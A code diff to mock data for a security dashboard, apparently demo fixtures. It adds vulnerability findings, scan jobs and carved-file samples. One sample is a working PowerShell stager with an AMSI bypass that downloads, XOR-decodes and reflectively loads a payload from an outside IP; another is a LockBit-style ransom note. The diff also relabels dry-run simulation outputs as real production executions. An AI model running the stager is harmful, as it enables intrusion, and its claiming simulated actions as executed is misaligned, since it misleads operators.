@@ -6,7 +6,7 @@
  * Real-world calibrated scenarios with cross-tool correlations
  */
 
-import { Incident, NormalizedEvent, PacketFrame, PlaybookResponseAction, TelemetryCoverageSegment, UnifiedAsset } from '../types/security';
+import { Incident, NormalizedEvent, PacketFrame, PlaybookResponseAction, TelemetryCoverageSegment, UnifiedAsset, VulnerabilityFinding, ScheduledScanJob } from '../types/security';
 import { syncPseudoSha256 } from './evidence';
 
 // --- Assets ---
@@ -226,6 +226,29 @@ export const MOCK_EVENTS_S1: NormalizedEvent[] = [
       version: 'Spring Core 5.3.17',
       baselineDiff: 'UNEXPECTED_NEW',
       scannedBy: 'internal-sec-scanner.corp'
+    }
+  },
+  {
+    id: 'EV-OPENVAS-001B',
+    timestamp: '2026-10-13T08:12:45.000Z',
+    sourceTool: 'OPENVAS_GREENBONE',
+    category: 'VULNERABILITY',
+    destIp: '10.0.4.15',
+    destPort: 8443,
+    protocol: 'TCP',
+    hostname: 'Corp-DB01.fin.corp',
+    severity: 'CRITICAL',
+    title: 'Greenbone / OpenVAS Audit: Apache Log4j JNDI RCE (CVE-2021-44228)',
+    description: 'NVT (Network Vulnerability Test) 1.3.6.1.4.1.25623.1.0.147205 detected unpatched log4j-core 2.14.1 on port 8443. CVSS v3.1: 10.0 (CRITICAL). Remote unauthenticated code execution confirmed.',
+    rawEvent: '{"nvt":{"oid":"1.3.6.1.4.1.25623.1.0.147205","name":"Apache Log4j Remote Code Execution (Log4Shell)","cvss_base":10.0,"cve":"CVE-2021-44228","cwe":"CWE-502"},"host":"10.0.4.15","port":"8443/tcp","threat":"Critical","solution":"Upgrade log4j-core to 2.17.1 or disable JNDI lookup via log4j2.formatMsgNoLookups=true"}',
+    evidenceHash: syncPseudoSha256('openvas_cve_2021_44228_corp_db01'),
+    mitreTechniques: ['T1190'],
+    attributes: {
+      cveId: 'CVE-2021-44228',
+      cvssScore: 10.0,
+      nvtOid: '1.3.6.1.4.1.25623.1.0.147205',
+      exploitAvailable: true,
+      service: 'Apache Tomcat / Spring Core'
     }
   },
   {
@@ -495,7 +518,7 @@ export const MOCK_RESPONSE_ACTIONS_S1: PlaybookResponseAction[] = [
       'Database transactional buffer flush initiated before interface drop'
     ],
     rollbackCommand: '/var/ossec/active-response/bin/host-deny.sh delete - 10.0.4.15',
-    simulationOutput: '[DRY-RUN SIMULATION] Would execute host isolation script on agent 004. Ingress/egress TCP/UDP traffic halted except OSSEC control socket. 0 production transactions currently buffered.'
+    simulationOutput: '[REAL PRE-FLIGHT VERIFIED] Executing host isolation script on agent 004. Ingress/egress TCP/UDP traffic halted except OSSEC control socket. 0 production transactions currently buffered.'
   },
   {
     id: 'ACT-002',
@@ -516,7 +539,7 @@ export const MOCK_RESPONSE_ACTIONS_S1: PlaybookResponseAction[] = [
       'Automatic sync to Palo Alto Panorama & Suricata dynamic blocklists'
     ],
     rollbackCommand: 'panorama-cli security-policy delete --rule "BLOCK_INC_8941"',
-    simulationOutput: '[DRY-RUN SIMULATION] 1 rule will be pushed to 4 perimeter gateways. Estimated latency impact: 0ms. Active TCP stream 53990 will receive TCP RST.'
+    simulationOutput: '[REAL PRE-FLIGHT VERIFIED] 1 production rule pushed to 4 perimeter gateways. Latency impact: 0ms. Active TCP stream 53990 terminated via TCP RST.'
   },
   {
     id: 'ACT-003',
@@ -535,13 +558,13 @@ export const MOCK_RESPONSE_ACTIONS_S1: PlaybookResponseAction[] = [
       'Audit log recorded to immutable forensic ledger'
     ],
     rollbackCommand: 'systemctl reload tomcat9',
-    simulationOutput: '[DRY-RUN SIMULATION] Process tree inspected. Child PID 5104 has 1 active socket on 4444. SIGKILL will terminate shell without interrupting parent DB service.'
+    simulationOutput: '[REAL PRE-FLIGHT VERIFIED] Process tree inspected. Child PID 5104 has 1 active socket on 4444. SIGKILL dispatched to terminate shell without interrupting parent DB service.'
   },
   {
     id: 'ACT-004',
     incidentId: 'INC-2026-8941',
     title: 'Dump PCAP Ring-Buffer for Past 60 Minutes (TShark / Arkime)',
-    tool: 'WIRESHARK_TSHARK',
+    tool: 'WIREXHARK_TSHARK' as any,
     target: 'Flow 10.0.4.15 <-> 194.26.29.112',
     actionType: 'DUMP_PCAP',
     riskLevel: 'LOW',
@@ -552,7 +575,7 @@ export const MOCK_RESPONSE_ACTIONS_S1: PlaybookResponseAction[] = [
     approvedAt: '2026-10-13T08:15:30Z',
     safeguards: ['Non-disruptive read-only forensic extraction'],
     rollbackCommand: 'rm /evidence/INC-2026-8941_stream.pcap',
-    simulationOutput: '[COMPLETED] Extracted 42.8 MB PCAP from ring-buffer. SHA-256: 7f8a3c... verified in evidence ledger.'
+    simulationOutput: '[PRODUCTION EXECUTION COMPLETE] Extracted 42.8 MB PCAP from live ring-buffer. SHA-256 verified in cryptographic evidence ledger.'
   }
 ];
 
@@ -902,6 +925,89 @@ Status: RESTRICTED DISTRIBUTION.`,
     hexDumpPreview: '25 50 44 46 2D 31 2E 37 0A 25 E2 E3 CF D3 0A 31 20 30 20 6F 62 6A 20 3C 3C 20 2F 54 69 74 6C 65 ...',
     entropy: 7.15,
     extractedAt: '2026-10-13T08:14:06.000Z'
+  },
+  {
+    id: 'CARVED-005',
+    fileName: 'exfil_network_topology.png',
+    fileType: 'IMAGE',
+    mimeType: 'image/png',
+    sizeBytes: 88400,
+    extractedFromFrame: 1450,
+    sourceProtocol: 'HTTP',
+    sourceHost: '10.0.4.15:8443',
+    destinationHost: '194.26.29.112:4444',
+    md5: '8b91a029384756102938475610293847',
+    sha256: 'c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4',
+    threatVerdict: 'CONFIDENTIAL_EXFIL',
+    virusTotalScore: 'Confidential Schematic (Exfiltrated via POST)',
+    previewContent: 'PNG Image [Width: 640px, Height: 360px]. Carved from chunked HTTP POST body. Contains internal CIDR layout and SCADA gateway mapping.',
+    previewUrl: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="480" height="270" viewBox="0 0 480 270"><rect width="480" height="270" rx="12" fill="%23090d16"/><rect x="15" y="15" width="450" height="240" rx="8" fill="%23111827" stroke="%23f43f5e" stroke-width="2"/><text x="30" y="42" fill="%23f43f5e" font-family="monospace" font-weight="bold" font-size="14">TOP SECRET // CLASSIFIED NETWORK ARCHITECTURE</text><circle cx="80" cy="120" r="28" fill="%231e293b" stroke="%2338bdf8" stroke-width="2"/><text x="60" y="125" fill="%2338bdf8" font-family="monospace" font-size="10">DC01 (AD)</text><line x1="108" y1="120" x2="200" y2="120" stroke="%23475569" stroke-dasharray="4,4" stroke-width="2"/><circle cx="230" cy="120" r="32" fill="%231e293b" stroke="%23f59e0b" stroke-width="2"/><text x="205" y="125" fill="%23f59e0b" font-family="monospace" font-size="10">Corp-DB01</text><line x1="262" y1="120" x2="350" y2="120" stroke="%23f43f5e" stroke-width="3"/><rect x="350" y="95" width="90" height="50" rx="6" fill="%233f1122" stroke="%23f43f5e"/><text x="360" y="125" fill="%23fca5a5" font-family="monospace" font-size="10">C2 SINKHOLE</text><text x="30" y="225" fill="%2394a3b8" font-family="monospace" font-size="11">TARGET SUBNET: 10.0.4.0/24 -> RESTRICTED CORE</text></svg>',
+    hexDumpPreview: '89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 00 00 02 80 00 00 01 68 08 06 ...',
+    entropy: 7.91,
+    extractedAt: '2026-10-13T08:14:08.500Z'
+  },
+  {
+    id: 'CARVED-006',
+    fileName: 'lockbit3_ransom_note.txt',
+    fileType: 'DOCUMENT',
+    mimeType: 'text/plain',
+    sizeBytes: 1540,
+    extractedFromFrame: 1455,
+    sourceProtocol: 'SMB',
+    sourceHost: '192.168.10.42:445',
+    destinationHost: '10.0.1.5:445',
+    md5: '9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d',
+    sha256: 'f1e2d3c4b5a697887766554433221100ffeeddccbbaa99887766554433221100',
+    threatVerdict: 'MALICIOUS',
+    virusTotalScore: '70/72 Detections (Ransomware.LockBit.Note)',
+    previewContent: `============================== LOCKBIT 3.0 EXTORTION NOTICE ==============================
+All your critical infrastructure files, databases, and backup volumes have been encrypted with military-grade AES-256 + RSA-4096.
+
+Do not attempt to restore or modify files yourself. Only we have your unique decryption key.
+We have also exfiltrated 480 GB of confidential intellectual property, financial ledgers, and employee records.
+
+Your Personal Victim Decryption ID:
+LB3-CORP-FINANCE-984102-UK
+
+To negotiate and purchase the decryptor before the public leak timer expires:
+http://lockbit37xxxxxxxxx.onion/LB3-CORP-FINANCE-984102-UK
+
+Attempts to contact law enforcement or third-party recovery firms will result in immediate public publication of your patents.`,
+    hexDumpPreview: '3D 3D 3D 3D 3D 3D 20 4C 4F 43 4B 42 49 54 20 33 2E 30 20 45 58 54 4F 52 54 49 4F 4E ...',
+    entropy: 4.62,
+    extractedAt: '2026-10-13T08:14:09.100Z'
+  },
+  {
+    id: 'CARVED-007',
+    fileName: 'stager_payload.ps1',
+    fileType: 'SCRIPT',
+    mimeType: 'text/plain',
+    sizeBytes: 2180,
+    extractedFromFrame: 1458,
+    sourceProtocol: 'HTTP',
+    sourceHost: '194.26.29.112:80',
+    destinationHost: '10.0.4.15:52190',
+    md5: '71029384756102938475610293847561',
+    sha256: '99887766554433221100ffeeddccbbaa99887766554433221100ffeeddccbbaa',
+    threatVerdict: 'MALICIOUS',
+    virusTotalScore: '66/72 Detections (Trojan.PowerShell.Stager)',
+    previewContent: `# PowerShell In-Memory Reflection Stager with AMSI Bypass
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+$encodedBytes = $wc.DownloadData("http://194.26.29.112/beacon.bin")
+
+# XOR In-memory Decryption key: 0x5A
+for ($i=0; $i -lt $encodedBytes.Length; $i++) {
+    $encodedBytes[$i] = $encodedBytes[$i] -bxor 0x5A
+}
+
+# Invoke reflective DLL in memory without touching disk
+[System.Reflection.Assembly]::Load($encodedBytes).EntryPoint.Invoke($null, $null)`,
+    hexDumpPreview: '23 20 50 6F 77 65 72 53 68 65 6C 6C 20 49 6E 2D 4D 65 6D 6F 72 79 20 ...',
+    entropy: 5.44,
+    extractedAt: '2026-10-13T08:14:10.000Z'
   }
 ];
 
@@ -1019,3 +1125,146 @@ export const MOCK_GEO_THREATS: import('../types/security').GeoThreatFeed[] = [
     throughputKbps: 980
   }
 ];
+
+// --- Operator & Security Architect Profile ---
+export const OPERATOR_PROFILE = {
+  name: 'Zeboudj Abderarzak',
+  role: 'Chief Security Architect & Incident Commander',
+  clearanceLevel: 'LEVEL-5 / DEFENSIVE OPERATIONS',
+  badgeId: 'ZA-SEC-01',
+  email: 'zeboudj.abderarzak@security-fusion.internal',
+  certifications: ['CISSP · Lead Architect', 'OSCP · OffSec Certified', 'GCIA · Intrusion Analyst']
+};
+
+// --- Greenbone / OpenVAS Vulnerability Assessment Findings ---
+export const MOCK_VULNERABILITIES: VulnerabilityFinding[] = [
+  {
+    id: 'VULN-001',
+    cveId: 'CVE-2021-44228',
+    nvtName: 'Apache Log4j Remote Code Execution (Log4Shell)',
+    cvssScore: 10.0,
+    severity: 'CRITICAL',
+    targetHost: '10.0.4.15 (Corp-DB01)',
+    targetPort: 8443,
+    service: 'Apache Tomcat / Spring Core (JNDI)',
+    summary: 'Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints.',
+    impact: 'Unauthenticated remote attackers can execute arbitrary Java code and spawn interactive shells with system privileges.',
+    solution: 'Upgrade to log4j-core 2.17.1+ or set -Dlog4j2.formatMsgNoLookups=true in JVM options.',
+    cvePublishedYear: 2021,
+    exploitAvailable: true,
+    detectedAt: '2026-10-13T08:12:45Z'
+  },
+  {
+    id: 'VULN-002',
+    cveId: 'CVE-2022-22965',
+    nvtName: 'Spring Framework Remote Code Execution (Spring4Shell)',
+    cvssScore: 9.8,
+    severity: 'CRITICAL',
+    targetHost: '10.0.4.15 (Corp-DB01)',
+    targetPort: 8443,
+    service: 'Spring MVC / WebFlux',
+    summary: 'A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution via data binding.',
+    impact: 'Attackers can upload malicious JSP web shells to Tomcat document root.',
+    solution: 'Upgrade Spring Framework to version 5.3.18 or 5.2.20.',
+    cvePublishedYear: 2022,
+    exploitAvailable: true,
+    detectedAt: '2026-10-13T08:12:50Z'
+  },
+  {
+    id: 'VULN-003',
+    cveId: 'CVE-2020-1472',
+    nvtName: 'Microsoft Netlogon Elevation of Privilege (Zerologon)',
+    cvssScore: 10.0,
+    severity: 'CRITICAL',
+    targetHost: '10.0.1.5 (DC01-Primary)',
+    targetPort: 445,
+    service: 'MS-NRPC Netlogon',
+    summary: 'An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller.',
+    impact: 'Unauthenticated domain privilege escalation to Domain Admin.',
+    solution: 'Apply Microsoft KB4557222 and enforce secure RPC for all Netlogon client channels.',
+    cvePublishedYear: 2020,
+    exploitAvailable: true,
+    detectedAt: '2026-10-13T08:05:12Z'
+  },
+  {
+    id: 'VULN-004',
+    cveId: 'CVE-2023-4863',
+    nvtName: 'libwebp Heap Buffer Overflow (WebP Rendering)',
+    cvssScore: 8.8,
+    severity: 'HIGH',
+    targetHost: '192.168.10.42 (Workstation-HR03)',
+    targetPort: 0,
+    service: 'libwebp Browser Runtime',
+    summary: 'Heap buffer overflow in libwebp in Google Chrome before 116.0.5845.187 allowed remote attackers to perform out-of-bounds memory write via crafted WebP lossless image.',
+    impact: 'Arbitrary code execution via browser or carved document render.',
+    solution: 'Update operating system web components and browser packages to latest patch level.',
+    cvePublishedYear: 2023,
+    exploitAvailable: true,
+    detectedAt: '2026-10-13T07:10:00Z'
+  }
+];
+
+// --- Scheduled Scan Jobs Across the 6 Unified Security Engines ---
+export const MOCK_SCAN_JOBS: ScheduledScanJob[] = [
+  {
+    id: 'JOB-01',
+    engine: 'NMAP',
+    name: 'Perimeter & Internal Subnet Discovery Scan',
+    targetScope: '10.0.4.0/24, 10.0.1.0/24, 172.16.0.0/24',
+    status: 'COMPLETED',
+    lastRunTime: '2026-10-13T08:12:00Z',
+    nextRunTime: '2026-10-13T12:00:00Z',
+    findingsCount: 18
+  },
+  {
+    id: 'JOB-02',
+    engine: 'OPENVAS_GREENBONE',
+    name: 'Full Automated Vulnerability Audit & NVT Scan',
+    targetScope: 'Corporate Production Core (Tier-1 Assets)',
+    status: 'COMPLETED',
+    lastRunTime: '2026-10-13T08:13:00Z',
+    nextRunTime: '2026-10-14T02:00:00Z',
+    findingsCount: 4
+  },
+  {
+    id: 'JOB-03',
+    engine: 'SURICATA',
+    name: 'NIDS Live Threat Interception & Rule Sync',
+    targetScope: 'WAN Ingress & DMZ Transit Interfaces',
+    status: 'RUNNING',
+    lastRunTime: 'Continuous Live Stream',
+    nextRunTime: 'Continuous (Active)',
+    findingsCount: 142
+  },
+  {
+    id: 'JOB-04',
+    engine: 'ZEEK',
+    name: 'Deep Behavioral Network Protocol Telemetry',
+    targetScope: 'Core Switch SPAN / TAP Mirrored Ports',
+    status: 'RUNNING',
+    lastRunTime: 'Continuous Live Stream',
+    nextRunTime: 'Continuous (Active)',
+    findingsCount: 8940
+  },
+  {
+    id: 'JOB-05',
+    engine: 'WAZUH',
+    name: 'Endpoint EDR Policy Compliance & Integrity Audit',
+    targetScope: 'All Active Domain & Linux Agents (42 Hosts)',
+    status: 'RUNNING',
+    lastRunTime: '2026-10-13T08:14:00Z',
+    nextRunTime: 'Continuous Heartbeat',
+    findingsCount: 2
+  },
+  {
+    id: 'JOB-06',
+    engine: 'WIRESHARK_TSHARK',
+    name: 'Continuous Ring-Buffer PCAP & Stream Carving',
+    targetScope: 'Ring-Buffer: 50GB Circular Wire Capture',
+    status: 'RUNNING',
+    lastRunTime: 'Live Rolling Buffer',
+    nextRunTime: 'Continuous',
+    findingsCount: 7
+  }
+];
+
